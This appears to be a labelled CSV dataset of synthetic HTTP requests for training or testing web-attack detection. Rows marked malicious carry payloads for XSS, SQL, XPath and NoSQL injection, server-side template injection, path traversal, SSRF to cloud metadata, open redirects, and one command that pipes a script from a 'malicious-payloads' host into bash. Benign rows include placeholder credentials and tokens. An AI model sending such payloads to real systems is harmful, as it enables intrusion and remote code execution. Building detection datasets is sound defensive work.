label,text
benign,"POST /api/customer/v1/profiles/add HTTP/1.1
Host: secure-banking-solutions.jp
Authorization: Basic c2VjdXJlYXBpOnNlY3JldDEyMw==
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Content-Length: 212
Connection: keep-alive

<customerProfile>
  <firstName>Kentaro</firstName>
  <lastName>Saito</lastName>
  <dob>1988-09-23</dob>
  <email>kentaro.saito@secure-banking-solutions.jp</email>
  <phone>+81-90-1234-5678</phone>
  <address>
    <street>3-2-1 Ginza</street>
    <city>Chuo-ku</city>
    <postalCode>104-0061</postalCode>
    <country>Japan</country>
  </address>
</customerProfile>"
benign,"GET /media/images/gallery?category=mountains&sort=latest HTTP/1.1
Host: photoviewer-secure.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Referer: https://photoviewer-secure.org/home
DNT: 1"
malicious,"GET /user/settings?tab=security HTTP/1.1
Host: encrypted-cloud-vault.xyz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) ""><script>eval(atob('YWxlcnQoJ1NlY3VyaXR5IGJyb3dha2luZycp'))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /v2/user/notifications/latest HTTP/1.1
Host: api.online-retail-store.biz
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://www.online-retail-store.biz
Authorization: Bearer qwerty1234567890abcdef
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.7"
benign,"GET /api/v2/articles/latest?category=technology HTTP/1.1
Host: news-trendwatchers.digital
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json, text/plain, */*
DNT: 1
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"POST /community/forum/upload CSV HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Type: text/csv
Content-Length: 106
Accept: text/html,application/xhtml+xml
DNT: 1
Origin: https://community.game-dev-forum.org
Cache-Control: max-age=0
Connection: keep-alive

thread_id,author,message
785,zthedev,Welcome everyone to the new monthly game jam thread!
786,gamer92,Looking forward to collaborating.
787,code_wiz,Happy to join and share ideas."
benign,"HEAD /blog/how-to-breathe-right HTTP/1.1
Host: mindful-living-journal.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
DNT: 1"
benign,"GET /api/v2/user-activity/logs?event=login&success=true&limit=50 HTTP/1.1
Host: analytics-tracker.cloud-data-services.ai
Accept: application/json
User-Agent: curl/7.85.0
Accept-Encoding: deflate
X-Forwarded-For: 198.27.230.41"
malicious,"PUT /api/v1/deserialize HTTP/1.1
Host: middleware-object-gateway.org
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Length: 396

{
  ""objectData"": ""rO0ABXNyAHRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXA7fGNvbnRleHRpZD0lMDAqQHVzZXImbWV0aG9kPSpleGVjACBybG9jYXRpb24vc2VsZWN0L2ZpbGU=""
}"
benign,"GET /collections/seasonal/items?material=cotton&material=wool&material=linen&style=casual HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://online-retail-store.biz/home
Connection: keep-alive"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Referer: https://community.game-dev-forum.org/wiki/Main_Page
Cookie: sessionid=938fj39skdjsdf3039d9"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: newsletter.my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://newsletter.my-personal-blog-site.info/latest"
benign,"PUT /api/v3/config/device/987654321/image HTTP/1.1
Host: iot-device-portal.tech
User-Agent: Python-urllib/3.10
Content-Type: application/octet-stream
Content-Length: 220
Authorization: ApiKey a1b2c3d4e5f67890abcdef1234567890
Accept-Encoding: gzip
Connection: close

QW4gaW9UIERldmljZSBpbWFnZSB1cGxvYWQgdXNpbmcgYmluYXJ5LWRhdGEgZW5jb2RlZCBpbiBCYXNlNjQuDQpBY3R1YWwgZGF0YSBpbXBsZW1lbnRhdGlvbi4="
malicious,"GET /api/download?template=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afhome%c0%ae%c0%afuser%c0%ae%c0%afsecret HTTP/1.1
Host: data-mining-platform.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en
Cache-Control: no-cache
Connection: close"
benign,"POST /api/courses HTTP/1.1
Host: learnwave.education
Authorization: Bearer nWlTz127rPeoYlkJgz1ASVdF
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.85.0
Content-Length: 162
Connection: close

{""name"":""Introduction to Marine Biology"",""description"":""A foundational course exploring marine ecosystems and biodiversity."",""durationWeeks"":8,""instructor"":{""name"":""Dr. Erin Bennett"",""email"":""ebennett@learnwave.education""}}"
benign,"POST /avatar/update HTTP/1.1
Host: interactive-learning-platform.edu
User-Agent: Python-urllib/3.11
Accept-Encoding: identity
Content-Type: multipart/form-data; boundary=----LearningBoundary007
Content-Length: 351
Cookie: sessionid=al0jdbkzya48yq737
Connection: keep-alive

------LearningBoundary007
Content-Disposition: form-data; name=""image_file""; filename=""student_avatar.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------LearningBoundary007
Content-Disposition: form-data; name=""caption""

Updated avatar for course profile
------LearningBoundary007--"
benign,"GET /library/search?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
User-Agent: curl/7.88.1
Connection: close"
malicious,"POST /api/v1/user/redirect HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: https://www.online-retail-store.biz
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /forum/topics?tag=javascript&tag=webdev&tag=frontend&sort=recent HTTP/1.1
Host: community.developer-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.6
Cookie: sessionid=a4f96c6ba2e5d0b92fa230f8e5142731; locale=en_US"
benign,"HEAD /services/health HTTP/1.1
Host: realtime-tracking-pro.io
User-Agent: python-requests/2.27.1
Accept: */*
Via: 1.1 proxy.tracking.local
Connection: close"
benign,"GET /news/local/2024/04/important-announcement.html HTTP/1.1
Host: city-daily-press.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /static/js/main.3e7f9b2c.chunk.js HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/javascript, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: max-age=86400
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
malicious,"POST /api/v2/trigger HTTP/1.1
Host: analytics.reporting-hub.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/json
Content-Length: 138
Referer: https://analytics.reporting-hub.ai/dashboard

{""job"":""refresh_data"",""command"":""/usr/bin/refresh.sh && curl http://malicious-payloads.my-personal-blog-site.info/loader.sh | bash""}"
malicious,"PUT /api/v2/user/updateProfile HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 110
Accept: application/json
User-Agent: curl/7.77.0
X-CSRF-Token: 9a8b7c6d5f123e4a982bf3c7d1caa20b

{""email"": ""jessica.new@cloud-data-services.ai"", ""bio"": ""Security researcher' AnD (SeLeCt CoUnT(*) FroM usErs) > 10 -- ""}"
benign,"POST /api/upload/finance/report HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: text/csv
Content-Length: 94
Connection: keep-alive
Authorization: Bearer T0k3nReAl1234567890SampleToken
X-CSRF-Token: 1abf87c297b4936f8e2c1ba1f2056342

month,revenue,expenses
January,103000,75000
February,98000,67000
March,112000,69000"
benign,"POST /cart/add-item HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Connection: keep-alive
Referer: https://online-retail-store.biz/products/electronics/camera
Cookie: cart_id=xyz789abc456

product_id=5689&quantity=2&coupon_code="
benign,"POST /doc-upload HTTP/1.1
Host: my-office-fileservice.net
Content-Type: multipart/form-data; boundary=----MultipartBoundary98A2YC2ElpDtknF
User-Agent: curl/7.88.1
Accept: */*
Connection: keep-alive

------MultipartBoundary98A2YC2ElpDtknF
Content-Disposition: form-data; name=""document""; filename=""contract_agreement.pdf""
Content-Type: application/pdf

%PDF-1.5
% dummy contract document content
------MultipartBoundary98A2YC2ElpDtknF
Content-Disposition: form-data; name=""client""

ACME Corp
------MultipartBoundary98A2YC2ElpDtknF--"
benign,"GET /blog/article/view/425 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Cookie: user_lang=en; prefs=fontSize=small&showImages=1; visit_stamp=1713123456
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /data/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27netstat%20-an%27).read()%7D%7D/info HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"GET /search/users?filter%5Buser_id%5D%5B%24gt%5D=&filter%5Bstatus%5D=active HTTP/1.1
Host: global-multimedia-streaming.org
User-Agent: Wget/1.21.1
Accept: */*
Cache-Control: max-age=0
Connection: close"
benign,"GET /articles/health/wellness-tips-for-seniors HTTP/1.1
Host: greenpath-wellbeing.org
User-Agent: Twitterbot/1.0
Accept: text/html,application/xhtml+xml
Referer: https://twitter.com/user/status/1234567890
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v1/device/status?cmd=view_details&device=RIC24F HTTP/1.1
Host: iot-management-platform.tech
Accept: application/json
User-Agent: curl/7.82.0
Connection: close
X-Forwarded-For: 192.168.1.15"
benign,"POST /store/cart/add-item HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.85.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 96
Connection: close
Referer: https://online-retail-store.biz/products/electronics/tv/details

csrf_token=6d78bc9fbd9647e19dae2513c&form_id=addToCart&timestamp=1686109327&product_id=tv4k-2023&quantity=1&return_url=%2Fcart"
benign,"POST /api/v4/accounts/password/reset-request HTTP/1.1
Host: global-finance-hub.co
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Origin: https://global-finance-hub.co
Content-Length: 44

{""email"":""marie.leblanc@global-finance-hub.co""}"
benign,"GET /soap/getEmployee?id=9901 HTTP/1.1
Host: hr-data-exchange.ai
Accept: application/xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Authorization: Basic dXNlcjIzOnBhc3N3b3JkMjM=
Connection: close"
benign,"PUT /config/env_vars/.env HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/octet-stream
Content-Length: 160
Authorization: Basic c2VjdXJlVXNlcjpwYXNzd29yZDEyMyE=
Accept: */*
Connection: keep-alive

UE9TVF9TRVRUSU5HU1xuREVCVElOX1NFXF9NRU1PUlk9IjEyMjMiXG50cmFjZUtleT0iQUJDRDEyMzRWVUxFIn0="
malicious,"GET /media/fetch?img=http%3A%2F%2Fstorage.cloud-daxia.tech%2Fpromo.png&img=http%3A%2F%2F172.16.0.10%2Finternal-api%2Fstatus&size=large HTTP/1.1
Host: cdn.cloud-daxia.tech
User-Agent: Python-urllib/3.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
benign,"GET /products/software/license-keys HTTP/1.1
Host: digital-product-marketplace.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/json
Accept-Language: en-GB,en;q=0.8
Via: 1.1 proxyserver.example
Connection: close"
benign,"GET /devices/monitor?cmd=get_overview HTTP/1.1
Host: tech-support-hub.org
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: keep-alive"
malicious,"GET /content/fetch?webhook_url=https://192.168.178.1/private/api HTTP/1.1
Host: analytics-reporting-suite.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: close"
malicious,"POST /api/v1/resources/query HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept-Encoding: gzip
Accept: application/xml
Content-Type: application/xml
Content-Length: 153
Cache-Control: max-age=0

<searchRequest>
  <term>' or '1'='1' or name()='</term>
  <category>inventory</category>
</searchRequest>"
benign,"GET /user/joined-threads HTTP/1.1
Host: global-cineforum.live
Connection: keep-alive
Accept: text/html
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://global-cineforum.live/dashboard
Cookie: login=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Vb3MoMX2tLMWo6hJrO0MTXk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15"
benign,"GET /api/v3/items/search?filter=recent&limit=20 HTTP/1.1
Host: api.cloud-data-services.ai
X-Forwarded-For: 172.16.254.1
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"POST /api/v2/comments/new HTTP/1.1
Host: interactive-webtools.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 231
Accept: text/html,application/xhtml+xml
Referer: https://interactive-webtools.io/tutorials/74
Origin: https://interactive-webtools.io
Accept-Language: en-GB,en;q=0.8
Connection: close

message=Can+anyone+explain+how+to+interpret+the+following+snippet%3A+%3Cp%3Efunction+loadContent%28%29+%7B+var+x+%3D+document.getElementById%28%27main%27%29;+x.innerHTML+%3D+%27Hello+World%27%3B+%7D%3C%2Fp%3E+Especially+the+use+of+the+%3Cscript%3E+tag+inside+a+single+page+app%3F"
benign,"POST /CustomerService.asmx HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 388
Accept: application/soap+xml
X-Requested-With: XMLHttpRequest
Referer: https://my-personal-blog-site.info/contact
Connection: keep-alive

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <SubmitContactForm xmlns=""http://my-personal-blog-site.info/ws"">
      <Name>Emma Clark</Name>
      <Email>emma.clark@my-personal-blog-site.info</Email>
      <Message>Hello, I enjoyed reading your recent post on minimalist travel tips! Thanks for sharing.</Message>
    </SubmitContactForm>
  </soap:Body>
</soap:Envelope>"
benign,"OPTIONS /api/public/events/list HTTP/1.1
Host: event-management.services
Origin: https://app.social-networking-site.net
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Accept, Content-Type
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json
Connection: keep-alive"
benign,"GET /dashboard/data?token=7f830712a10b4e53a9d5e4b17c96bb983e71d5f270aab546d4a1af2b3c9e2256a59b3e8e769465587aeb855c0dcb17121158e3a2f5939bd9b8e16665df2c0a0f HTTP/1.1
Host: analytics-data-hub.io
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Forwarded-For: 203.0.113.45"
benign,"GET /papers/annual_financial_review.pdf HTTP/1.1
Host: capital-investment-group.io
Accept: application/pdf
Referer: https://capital-investment-group.io/investor-relations/financials
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br"
benign,"GET /store/electronics/audio/headphones HTTP/1.1
Host: urbantech-market.biz
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://urbantech-market.biz/store/electronics
Cookie: session_key=87a3b9f5d47fe374a126d1845f3b5297
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not:A-Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""iOS""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"POST /portal/team/invite HTTP/1.1
Host: global-enterprise-solutions.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 108
Connection: keep-alive
Referer: https://global-enterprise-solutions.co/portal/team
Cookie: sessionid=f214a2d8909cf512bd0e837a

csrf_token=c7065a3f4b9a4db0a5e3e76a&form_id=teamInvite&timestamp=1686145402&email=erin.jones%40corporate.com&role=Editor&return_url=%2Fportal%2Fteam"
malicious,"POST /profile/update HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Cache-Control: no-cache
Pragma: no-cache

user=devMike&bio=Game+developer+and+enthusiast&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E"
benign,"GET /api/v1/widget/suggestions?lang=en&count=10 HTTP/1.1
Host: smart-home-automation.uk
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://smart-home-automation.uk/dashboard"
malicious,"GET /api/fetch_image?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: media-secure-harvester.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://media-secure-harvester.net/gallery/view
Connection: close"
malicious,"POST /redirect HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: */*
User-Agent: curl/7.77.0
X-Requested-With: XMLHttpRequest
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /auth/login HTTP/1.1
Host: portal.tech-solutions-group.de
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Connection: keep-alive
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0

username=elisabeth.schmidt&password=Berlin2024!&callback=/user/account/security-settings"
benign,"GET /news/weather/daily/region/us-northeast HTTP/1.1
Host: climate-insights-service.ai
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N975U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/xml, text/xml;q=0.9
Accept-Language: en-US,en;q=0.7
If-None-Match: ""74b1f42e6c3a2""
Connection: keep-alive"
malicious,"POST /profile/update HTTP/1.1
Host: mobileapp-content-api.education-cloud.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 79
Connection: keep-alive

displayName=student42&preferences%5Blanguage%5D=en%2DGB&role_id=3&internal_user_status=AUTHORIZED"
benign,"POST /api/v1/auth/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 72

{""username"":""clare.hendrix"",""password"":""huntingtonPark89""}"
benign,"POST /api/session HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Origin: https://community.game-dev-forum.org
X-CSRF-Token: 3b41278f1a5cf89d30498d67eeacba67
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/114.0
Content-Length: 67

{""username"":""gamer_daniel1990"",""password"":""Champion2023!""}"
benign,"POST /login HTTP/1.1
Host: login.cloud-file-storage.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Referer: https://login.cloud-file-storage.net/login
Connection: keep-alive

user=alice.johnson&pass=Saf3Pa$$&redirect_uri=https%3A%2F%2Flogin.cloud-file-storage.net%2Fhome"
benign,"POST /api/device/config HTTP/1.1
Host: smart-home-hub.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/json
Accept: application/json
Content-Length: 74
X-Forwarded-For: 192.168.22.45
Connection: keep-alive

{""device_name"":""light-controller"",""set_mode"":""eco-save"",""commands"":[""dim_50"",""auto_off""]}"
malicious,"GET /dashboard/stats HTTP/1.1
Host: metrics-insight-center.io
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /api/v1/comment/new HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Content-Length: 168
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://community.game-dev-forum.org/threads/20987

{""thread_id"":20987,""author"":""PixelNinja"",""user_comment"":""Great tips on game design! Worth checking this link: javascript:alert('XSS')""}"
benign,"POST /user/preferences/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.58 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-CSRF-Token: bT7vwXZTjsQBlErqnZ5-NvsQnjN-huK8PXhv
Content-Length: 154
Connection: keep-alive

{""selectedCategories"":[""technology"",""health"",""travel"",""photography""],""newsletterSubscribed"":true,""preferredLanguage"":""en-US""}"
